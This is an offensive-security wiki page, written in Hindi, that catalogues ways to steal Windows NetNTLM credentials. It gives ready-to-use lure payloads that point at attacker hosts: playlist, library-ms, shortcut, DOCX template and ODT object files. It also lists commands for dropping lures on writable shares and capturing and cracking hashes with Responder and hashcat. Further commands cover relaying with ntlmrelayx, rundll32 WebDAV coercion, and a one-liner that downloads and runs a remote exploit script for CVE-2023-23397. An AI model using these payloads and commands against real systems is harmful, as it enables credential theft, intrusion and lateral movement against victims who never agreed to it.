# NTLM creds चुराने की जगहें

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) पर दिए गए सभी बेहतरीन विचार देखें—ऑनलाइन Microsoft Word फ़ाइल download करने से लेकर NTLM leaks source तक: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Writable SMB share + Explorer से ट्रिगर होने वाले UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

अगर आप **ऐसे share पर लिख सकते हैं जिसे users या scheduled jobs Explorer में browse करते हैं**, तो ऐसी फ़ाइलें डालें जिनका metadata आपके UNC की ओर point करता हो (जैसे `\\ATTACKER\share`)। फ़ोल्डर को render करने पर **implicit SMB authentication** ट्रिगर होता है और आपके listener को **NetNTLMv2** leak हो जाता है।<sup>[[1]](#references)</sup>

1. **Lures बनाएं** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF आदि शामिल हैं)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **उन्हें writable share पर छोड़ें** (कोई भी फ़ोल्डर जिसे पीड़ित खोलता है):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **सुनें और crack करें**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows एक साथ कई फ़ाइलों तक पहुँच सकता है; Explorer जिस भी चीज़ का preview दिखाता है (`BROWSE TO FOLDER`), उसके लिए क्लिक करने की ज़रूरत नहीं होती।

### Windows Media Player playlists (.ASX/.WAX)

अगर आप किसी target से अपनी नियंत्रित Windows Media Player playlist खुलवा या उसका preview दिखवा सकते हैं, तो entry को UNC path पर सेट करके Net‑NTLMv2 leak कर सकते हैं। WMP SMB के ज़रिए संदर्भित media फ़ाइल लाने की कोशिश करेगा और बिना किसी अतिरिक्त कार्रवाई के authenticate करेगा।<sup>[[3]](#references)[[4]](#references)</sup>

उदाहरण payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

संग्रह और cracking flow:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP में एम्बेडेड .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, ZIP archive के भीतर से सीधे खोली गई .library-ms files को असुरक्षित तरीके से हैंडल करता है। अगर library definition किसी remote UNC path (जैसे, \\attacker\share) की ओर इशारा करती है, तो ZIP के भीतर मौजूद .library-ms को बस ब्राउज़ करने/लॉन्च करने से Explorer उस UNC को enumerate करता है और attacker को NTLM authentication भेजता है। इससे NetNTLMv2 मिलता है, जिसे offline crack किया जा सकता है या संभावित रूप से relay किया जा सकता है।<sup>[[2]](#references)</sup>

Attacker UNC की ओर इशारा करने वाली न्यूनतम .library-ms file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

ऑपरेशनल चरण
- ऊपर दिए गए XML से .library-ms फ़ाइल बनाएँ (अपना IP/hostname सेट करें)।
- इसे ZIP में compress करें (Windows पर: Send to → Compressed (zipped) folder) और ZIP को target तक पहुँचाएँ।
- NTLM capture listener चलाएँ और victim के ZIP के अंदर से .library-ms खोलने का इंतज़ार करें।


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net-NTLMv2 leak

Microsoft Outlook for Windows, calendar items में extended MAPI property PidLidReminderFileParameter को process करता था। अगर यह property किसी UNC path (जैसे, \\attacker\share\alert.wav) पर point करती थी, तो reminder बजने पर Outlook SMB share से संपर्क करता था और बिना किसी click के user का Net-NTLMv2 leak हो जाता था। इसे 14 मार्च, 2023 को patch किया गया था, लेकिन legacy/untouched fleets और ऐतिहासिक incident response के लिए यह अब भी अत्यंत प्रासंगिक है।<sup>[[5]](#references)</sup>

PowerShell (Outlook COM) से तुरंत exploitation:

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Listener side:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notes
- रिमाइंडर ट्रिगर होने पर victim के Windows के लिए Outlook का चलना ही पर्याप्त है।
- leak से Net‑NTLMv2 मिलता है, जो offline cracking या relay के लिए उपयुक्त है (pass-the-hash नहीं)।

### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 का bypass)

Windows Explorer shortcut icons को अपने-आप render करता है। हाल के शोध से पता चला कि UNC-icon shortcuts के लिए Microsoft के अप्रैल 2025 patch के बाद भी, shortcut target को UNC path पर host करके और icon को local रखकर बिना किसी click के NTLM authentication trigger करना संभव था (इस patch bypass को CVE‑2025‑50154 असाइन किया गया)। केवल folder देखने से Explorer remote target से metadata retrieve करता है और attacker के SMB server को NTLM भेजता है।<sup>[[6]](#references)</sup>

न्यूनतम Internet Shortcut payload (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

PowerShell के ज़रिए प्रोग्राम शॉर्टकट payload (.lnk):

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

डिलीवरी के तरीके
- शॉर्टकट को ZIP में डालें और पीड़ित से उसे ब्राउज़ करवाएँ।
- शॉर्टकट को ऐसी writable share पर रखें जिसे पीड़ित खोलेगा।
- उसी फ़ोल्डर में अन्य lure files भी रखें, ताकि Explorer उन आइटम का preview दिखाए।

### ExtraData icon path के ज़रिए no-click .LNK NTLM leak (CVE‑2026‑25185)

Windows `.lnk` metadata को सिर्फ़ execution के समय नहीं, बल्कि **view/preview** (icon rendering) के दौरान भी load करता है। CVE‑2026‑25185 में एक parsing path दिखाया गया है, जहाँ **ExtraData** blocks के कारण shell icon path को resolve करता है और **load के दौरान** filesystem को access करता है। अगर path remote हो, तो इससे outbound NTLM भेजा जाता है।

मुख्य trigger conditions (`CShellLink::_LoadFromStream` में देखी गई):
- ExtraData में **DARWIN_PROPS** (`0xa0000006`) शामिल करें (icon update routine तक पहुँचने की शर्त)।
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) शामिल करें और **TargetUnicode** को populate करें।
- Loader, `TargetUnicode` में environment variables को expand करता है और परिणामी path पर `PathFileExistsW` को call करता है।

अगर `TargetUnicode` किसी UNC path (जैसे, `\\attacker\share\icon.ico`) पर resolve होता है, तो शॉर्टकट वाले फ़ोल्डर को **सिर्फ़ देखने** से outbound authentication हो जाता है। यही load path **indexing** और **AV scanning** से भी trigger हो सकता है, जिससे यह एक व्यावहारिक no-click leak surface बन जाता है।<sup>[[7]](#references)</sup>

इन structures को Windows GUI का उपयोग किए बिना बनाने/जाँचने के लिए **LnkMeMaybe** project में research tooling (parser/generator/UI) उपलब्ध है।<sup>[[8]](#references)</sup>


### `davclnt.dll,DavSetCookie` के ज़रिए WebDAV auth coercion / credential validation

Native **WebDAV client** का दुरुपयोग करके मौजूदा logon session को किसी भी **HTTP/WebDAV** endpoint पर authenticate करने के लिए मजबूर किया जा सकता है:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

यह क्यों उपयोगी है:
- **हमलावर-नियंत्रित WebDAV server** के विरुद्ध, यह custom client डाले बिना **HTTP पर NTLM** trigger कर सकता है।
- **आंतरिक hosts** के विरुद्ध, बाद में lateral movement करने से पहले यह **चोरी हुए credentials कहाँ स्वीकार किए जाते हैं, इसकी पुष्टि** करने का एक शांत तरीका है।<sup>[[9]](#references)</sup>
- जब **SMB egress फ़िल्टर किया गया हो**, लेकिन **HTTP/WebDAV** अब भी पहुँच योग्य हो, तो यह command एक अच्छा विकल्प है।

ऑपरेशनल नोट्स:
- स्रोत host पर **WebClient** service चल रही होनी चाहिए।
- `rundll32.exe`, `davclnt.dll` लोड करता है और Windows से **वर्तमान user के credentials** का उपयोग करके WebDAV authentication करवाता है।<sup>[[10]](#references)</sup>
- अगर आप इसे अपने नियंत्रण वाले infrastructure पर point करते हैं, तो NTLM-aware HTTP listener/relay का उपयोग करें, जैसे:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Detection के नज़रिए से, कई internal systems पर बार-बार `rundll32.exe davclnt.dll,DavSetCookie` चलना, सामान्य user behaviour के बजाय **credential validation / spray-like lateral movement prep** का मज़बूत संकेत है।<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents किसी external template का reference दे सकते हैं। अगर आप attached template को UNC path पर सेट करते हैं, तो document खोलने पर SMB से authentication होगा।

न्यूनतम DOCX relationship बदलाव (`word/` के अंदर):

1) `word/settings.xml` संपादित करें और attached template का reference जोड़ें:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) word/_rels/settings.xml.rels को संपादित करें और rId1337 को अपने UNC पर इंगित करें:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) .docx में फिर से पैक करके भेजें। अपना SMB capture listener चलाएँ और दस्तावेज़ खुलने का इंतज़ार करें।

### SMB authentication के लिए ODT external object

जब किसी document-upload path में `.odt` स्वीकार होता हो, लेकिन लक्ष्य Office `.docx` फ़ाइलें न खोलता हो, तो Office template के बजाय OpenDocument external object का उपयोग करें। Metasploit का `auxiliary/fileformat/odt_badodt` ऐसा ODT बनाता है जिसके `content.xml` में नीचे दिए गए संदर्भ जैसा on-load `draw:object` reference होता है। `LHOST` को SMB listener पर सेट करें, स्वीकृत workflow के ज़रिए ODT अपलोड करें, और किसी user या document processor के इसे खोलने पर बाहर जाने वाला NetNTLMv2 response capture करें। Filename-extension की जाँच इस embedded URL को नहीं देखती; लक्ष्य पर inbound NTLM restrictions से outbound authentication ज़रूरी नहीं कि रुक जाए।<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

NTLM को relay या abuse करने के post-capture ideas के लिए देखें:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 से DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction से webroot RCE → FullPowers + GodPotato से SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Microsoft में unpatched privilege escalation threats](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft ने Outlook EoP (CVE‑2023‑23397) को mitigates किया और PidLidReminderFileParameter के ज़रिए NTLM leak की व्याख्या की](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 की समीक्षा](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – जब IT Support कॉल करता है: Teams से Domain Compromise तक ModeloRAT Campaign का विश्लेषण](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Netntlm Hashes चुराने के दिलचस्प स्थान](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — ODT external-object NTLM capture](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
